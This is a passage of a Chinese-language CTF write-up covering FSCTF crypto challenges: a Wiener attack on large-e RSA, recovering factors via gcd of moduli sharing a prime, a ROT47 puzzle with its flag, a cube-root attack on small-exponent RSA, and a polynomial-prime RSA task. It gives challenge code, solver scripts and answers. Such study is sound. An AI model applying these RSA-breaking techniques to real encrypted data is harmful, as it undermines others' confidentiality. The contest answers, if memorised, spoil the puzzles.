Ê≥ÑÈú≤</p>\n</blockquote>\n<p><img data-src=\"/img/fsctfwppic/2.png\" alt=\"image-20231024081420584\"></p>\n<h3 id=\"big_e\"><a class=\"markdownIt-Anchor\" href=\"#big_e\">#</a> Big_e</h3>\n<pre><code>n = 12238605063252292170613110607692779326628090745751955692266649177882959231822580682548279800443278979485092243645806337103841086023159482786712759291169541633901936290854044069486201989034158882661270017305064348254800318759062921744741432214818915527537124001063995865927527037625277330117588414586505635959411443039463168463608235165929831344586283875119363703480280602514451713723663297066810128769907278246434745483846869482536367912810637275405943566734099622063142293421936734750356828712268385319217225803602442033960930413469179550331907541244416573641309943913383658451409219852933526106735587605884499707827\ne=  11850552481503020257392808424743510851763548184936536180317707155841959788151862976445957810691568475609821000653594584717037528429828330763571556164988619635320288125983463358648887090031957900011546300841211712664477474767941406651977784177969001025954167441377912326806132232375497798238928464025466905201977180541053129691501120197010080001677260814313906843670652972019631997467352264392296894192998971542816081534808106792758008676039929763345402657578681818891775091140555977382868531202964486261123748663752490909455324860302967636149379567988941803701512680099398021640317868259975961261408500449965277690517\nc=4218884541887711839568615416673923480889604461874475071333225389075770098726337046768413570546617180777109293884545400260353306419150066928226964662256930702466709992997796154415790565112167663547017839870351167884417142819504498662037048412313768450136617389372395690363188005647619061128497371121168347810294424378348301835826084732747005110258557662466626720961279087145559906371505117097599774430970980355531235913439823966628008554872896820907555353892843539526041019103819804854883231421963308265517622470779089941078841902464033685762524196275032288319744157255628189204988632871276637699312750636348750883054\n\n\nËØ∑Ëß£Âá∫ÊòéÊñáÔºÅÔºÅÔºÅ\n</code></pre>\n<blockquote>\n<p>Áª¥Á∫≥ÊîªÂáª</p>\n</blockquote>\n<p><img data-src=\"/img/fsctfwppic/3.png\" alt=\"image-20231024081609249\"></p>\n<h3 id=\"do-you-know-gcd\"><a class=\"markdownIt-Anchor\" href=\"#do-you-know-gcd\">#</a> Do you know gcd</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m1<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m2<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q1<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>q2<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>n1<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q1</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>n2<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q2</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>c1<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>c2<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n1=\"</span><span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n2=\"</span><span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c1=\"</span><span class=\"token punctuation\">,</span>c1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c2=\"</span><span class=\"token punctuation\">,</span>c2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>n1= 18680935400842120133090782991548100098299141114788036098274292600814484762178879421175852824971602717084073867867453382415307589970440719890918576225495401632854107018246844209327118177917122236073227158593514362850629722223228335334773008682775987859295083444638923726449899310854161394586430943134469559429878238769266114132469166535509030877235272476877484918308883799496627699789051809542538091061550107526246728583019140703765888157806778516567048103700384849598143249322109207879381251223776896702362630437178664824125387477797876186939235800859102380783259361745143574493440078787931593394188675093506492640857</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n2= 16308523133405725830120564525574438512803584148781960516042054284309437381876822602134185065101371986717984978566359252072738078020261823966208153922611063201149105749778596739692554295573408850719208215646167050188830459343054219856901871953140988948482577813730729085764541988120049026971705499798003225755018687242522370406495429425494022876627543617474873929054728724093702291448754458748923218635900061398716191201846139296921753782690468189409101899415028480878296408735247604084627019116374444335509072590669239349212479592499426230525792270750612371117196200786891891430446212938482959351978202358044864822577</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c1= 534518909595318304521410713148076850830155521838755402438490325620155197496935820831936109252194297244161393310730073882257949954815312409974998733265641354273665213856408848764503848122264972023143474923678585167025591255034150826271791019266426616987355463111138963331008761826310757292765842789380409826387579098421126952331558360737102888876551724241978020305977032047901621477384392409864427091911872691182528938458750707982564581322551517287491916691010743390992018974168703956622998928457142606354825714033609199676987795174032254878017883605565760275857658822315970522114838062469258676628619381342357632179</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>c2= 10248394002302905069278122013496854496130190499518622376819239887579692634750808499513497018453473232140518824608976734237637842228035017757831938865937098325684711995382081489403971465596662585196007547659143066184546400992333479193424580690897692586491475768279754939199148642035267049092880715299621206567123356521609120801306358100326600900326310677054810032471472266402660807205675696110133573150125117412696328434523507708110949743705536889950671778501402435457354251761692098671783596194430798692942013503015764266392551048702428063161786512924608239609802040937400619384828550050291094616346317726139970219621</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>n1<span class=\"token operator\">=</span> <span class=\"token number\">18680935400842120133090782991548100098299141114788036098274292600814484762178879421175852824971602717084073867867453382415307589970440719890918576225495401632854107018246844209327118177917122236073227158593514362850629722223228335334773008682775987859295083444638923726449899310854161394586430943134469559429878238769266114132469166535509030877235272476877484918308883799496627699789051809542538091061550107526246728583019140703765888157806778516567048103700384849598143249322109207879381251223776896702362630437178664824125387477797876186939235800859102380783259361745143574493440078787931593394188675093506492640857</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>n2<span class=\"token operator\">=</span> <span class=\"token number\">16308523133405725830120564525574438512803584148781960516042054284309437381876822602134185065101371986717984978566359252072738078020261823966208153922611063201149105749778596739692554295573408850719208215646167050188830459343054219856901871953140988948482577813730729085764541988120049026971705499798003225755018687242522370406495429425494022876627543617474873929054728724093702291448754458748923218635900061398716191201846139296921753782690468189409101899415028480878296408735247604084627019116374444335509072590669239349212479592499426230525792270750612371117196200786891891430446212938482959351978202358044864822577</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c1<span class=\"token operator\">=</span> <span class=\"token number\">534518909595318304521410713148076850830155521838755402438490325620155197496935820831936109252194297244161393310730073882257949954815312409974998733265641354273665213856408848764503848122264972023143474923678585167025591255034150826271791019266426616987355463111138963331008761826310757292765842789380409826387579098421126952331558360737102888876551724241978020305977032047901621477384392409864427091911872691182528938458750707982564581322551517287491916691010743390992018974168703956622998928457142606354825714033609199676987795174032254878017883605565760275857658822315970522114838062469258676628619381342357632179</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c2<span class=\"token operator\">=</span> <span class=\"token number\">10248394002302905069278122013496854496130190499518622376819239887579692634750808499513497018453473232140518824608976734237637842228035017757831938865937098325684711995382081489403971465596662585196007547659143066184546400992333479193424580690897692586491475768279754939199148642035267049092880715299621206567123356521609120801306358100326600900326310677054810032471472266402660807205675696110133573150125117412696328434523507708110949743705536889950671778501402435457354251761692098671783596194430798692942013503015764266392551048702428063161786512924608239609802040937400619384828550050291094616346317726139970219621</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> gcd<span class=\"token punctuation\">(</span>n1<span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>q1 <span class=\"token operator\">=</span> n1<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q2 <span class=\"token operator\">=</span> n2<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>phi1<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q1<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>phi2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q2<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>d1<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>d2<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>d1<span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>d2<span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ÂüÉÂ°ûÂÖãÁöÑÁßòÂØÜ\"><a class=\"markdownIt-Anchor\" href=\"#ÂüÉÂ°ûÂÖãÁöÑÁßòÂØÜ\">#</a> ÂüÉÂ°ûÂÖãÁöÑÁßòÂØÜ</h3>\n<pre><code>ÂüÉÂ°ûÂÖãÂÖàÁîüÂ∞ÜËá™Â∑±ÁöÑÁßòÂØÜËóèÂú®ÁõíÂ≠êÈáåÂπ∂‰∫§Áªô‰∫ÜROT‰øùÁÆ°ÔºåÂüÉÂ°ûÂÖãÂÖàÁîüÂú®ÁõíÂ≠ê‰∏äÁïô‰∏ã‰∫ÜËøôÊ†∑‰∏Ä‰∏≤Êï∞Â≠óÔºö\n117 36 114 37 117 76 37 57 111 63 60 48 74 64 70 78\n</code></pre>\n<p>ËΩ¨ ascii Á†ÅÂêéÔºåROT47</p>\n<pre><code>FSCTF&#123;Th@nk_you&#125;\n</code></pre>\n<h3 id=\"rsaÁ≠æÂà∞\"><a class=\"markdownIt-Anchor\" href=\"#rsaÁ≠æÂà∞\">#</a> RSA Á≠æÂà∞</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">assert</span> m<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">150</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>kbits <span class=\"token operator\">=</span> <span class=\"token number\">103</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>m <span class=\"token operator\">>></span> kbits<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> kbits</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Mod <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">2048</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>hint1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2019</span><span class=\"token operator\">-</span><span class=\"token number\">2023</span><span class=\"token operator\">*</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> Mod</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>hint2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2023</span><span class=\"token punctuation\">,</span> Mod<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'n ='</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'c ='</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hint1 ='</span><span class=\"token punctuation\">,</span>hint1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hint2 ='</span><span class=\"token punctuation\">,</span>hint2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n = 113369575322962228640839640796005129142256499725384495463316595604047079557930666699058024217561098997292782305151595366764483672240871690818579470888054811186902762990032505953330034837625667158114251720321766235335996441613828302393569643827293040591156144187232255906107532680524431761932215860898533224303</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c = 42336544435252811021843650684098817755849747192874682997240960601474927692351510022965782272751339319782351146077580929125</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>hint1 = 23620186624579054670890922956929031966199853422018331906359817627553015939570302421768667351617160816651880338639432052134891008193969801696035505565684982786461527274477933881508678074157199742425764746919878452990468268098540220237611917321213668069666526658025737487539455262610713002399515462380573732082344497124344090365729168706760425585735014513373401622860196569544933971210142724734536588173957576667830667503151362930889494877201597267000737408071228466811160470759093928003064486766171850080985758351203536462206720715743059101285822169971058423075796415932349942113371706910521251120400151508125606778268</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>hint2 = 963121833542317369601573845406471251262548645428284526828835768327851746644612875378048462019053502788803516653832734212104068969204751285764221918179043624419894139984279754512017898273159626328827668380262481220865017731267802600915375183179264380651165421367773563947903391466768557089792263481734108493385146063258300495764165365295546337808852673629710735621386935094923561594142327134318905856137785813985574356271679918694447015294481691849341917432346559501502683303082591585074576786963085039546446281095048723669230856548339087909922753762884060607659880382812905450025751549153093939827557015748608</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#Â∞èÊòéÊñáÊîªÂáª</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">113369575322962228640839640796005129142256499725384495463316595604047079557930666699058024217561098997292782305151595366764483672240871690818579470888054811186902762990032505953330034837625667158114251720321766235335996441613828302393569643827293040591156144187232255906107532680524431761932215860898533224303</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">42336544435252811021843650684098817755849747192874682997240960601474927692351510022965782272751339319782351146077580929125</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>hint1 <span class=\"token operator\">=</span> <span class=\"token number\">23620186624579054670890922956929031966199853422018331906359817627553015939570302421768667351617160816651880338639432052134891008193969801696035505565684982786461527274477933881508678074157199742425764746919878452990468268098540220237611917321213668069666526658025737487539455262610713002399515462380573732082344497124344090365729168706760425585735014513373401622860196569544933971210142724734536588173957576667830667503151362930889494877201597267000737408071228466811160470759093928003064486766171850080985758351203536462206720715743059101285822169971058423075796415932349942113371706910521251120400151508125606778268</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>hint2 <span class=\"token operator\">=</span> <span class=\"token number\">963121833542317369601573845406471251262548645428284526828835768327851746644612875378048462019053502788803516653832734212104068969204751285764221918179043624419894139984279754512017898273159626328827668380262481220865017731267802600915375183179264380651165421367773563947903391466768557089792263481734108493385146063258300495764165365295546337808852673629710735621386935094923561594142327134318905856137785813985574356271679918694447015294481691849341917432346559501502683303082591585074576786963085039546446281095048723669230856548339087909922753762884060607659880382812905450025751549153093939827557015748608</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>m<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>flag<span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezrsa\"><a class=\"markdownIt-Anchor\" href=\"#ezrsa\">#</a> ezRSA</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">keygen</span><span class=\"token punctuation\">(</span>nbit <span class=\"token operator\">=</span> <span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\tk <span class=\"token operator\">=</span> getRandomNBitInteger<span class=\"token punctuation\">(</span>nbit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\tp <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">6</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">114</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">31377</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tq <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">5</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">19</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> <span class=\"token number\">313</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">14</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">14011</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> isPrime<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> isPrime<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> p<span class=\"token punctuation\">,</span> q</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> e <span class=\"token operator\">=</span> <span class=\"token number\">31337</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tm <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">,</span> q <span class=\"token operator\">=</span> keygen<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>enc <span class=\"token operator\">=</span> encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'enc = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>enc<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>n = 1901485114700245088118015176838411045645808657633721129158322425051110390237801115516544893309422501851747092251796770953642000579931231478667887589988786560834446696408732292786254192492281586457284980263740183</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>enc = 1199361436656854951826843585559905358018072076349745598865984504434921942249797269971584270541920348511243191511578321283455075109027873358983934024677982086699270397304699932717071144314481599892879445599516848</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#sage</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">1901485114700245088118015176838411045645808657633721129158322425051110390237801115516544893309422501851747092251796770953642000579931231478667887589988786560834446696408732292786254192492281586457284980263740183</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token number\">1199361436656854951826843585559905358018072076349745598865984504434921942249797269971584270541920348511243191511578321283455075109027873358983934024677982086699270397304699932717071144314481599892879445599516848</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">31337</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>k<span class=\"token operator\">></span> <span class=\"token operator\">=</span> 